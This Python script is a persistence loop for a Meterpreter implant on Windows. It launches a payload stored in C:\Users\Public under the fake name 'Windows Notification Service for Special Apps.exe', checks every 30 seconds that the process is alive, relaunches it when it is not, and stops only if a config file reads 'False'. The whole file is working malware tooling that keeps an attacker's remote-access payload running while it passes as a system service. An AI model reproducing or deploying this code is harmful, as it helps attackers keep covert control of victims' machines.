import os
import subprocess
from time import sleep
import psutil
import sys

def checkIfProcessRunning(processName):
    '''
    Check if there is any running process that contains the given name processName.
    '''
    #Iterate over the all the running process
    for proc in psutil.process_iter():
        try:
            # Check if process name contains the given name string.
            if processName.lower() in proc.name().lower():
                return True
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
            pass
    return False

def checkConfig():
    if os.path.exists("C:\\Users\\Public\\config.txt"):
        print("File exists, reading")
        file = open("C:\\Users\\Public\\config.txt", "r")
        variable = file.readline()
        print(variable) 
        file.close()
        if variable.strip() == "True":
            return True
        if variable.strip() == "False":
            return False
        else:
            file = open("C:\\Users\\Public\\config.txt", "w")
            file.write("True")
            file.close()
    else:
        print("Doesnt exist")
        file = open("C:\\Users\\Public\\config.txt", "w")
        file.write("True")
        file.close()
        
    return True
    
    
if checkConfig() == False:
    sys.exit()
print("Starting persistence")
meterpreter_process = subprocess.Popen("C:\\Users\\Public\\Windows Notification Service for Special Apps.exe")
# check if PID exists 
print(meterpreter_process.pid)
numbers = 0
while True:
    sleep(30)
    if checkConfig() == False:
        sys.exit()
        
    if checkIfProcessRunning("Windows Notification Service for Special Apps.exe") == False:
        meterpreter_process = subprocess.Popen("C:\\Users\\Public\\Windows Notification Service for Special Apps.exe")
        print("Was not running, reran. New PID: " + str(meterpreter_process.pid))
    else:
        print("meterpreter_1.exe is running")
    numbers += 1
    print(numbers)
        


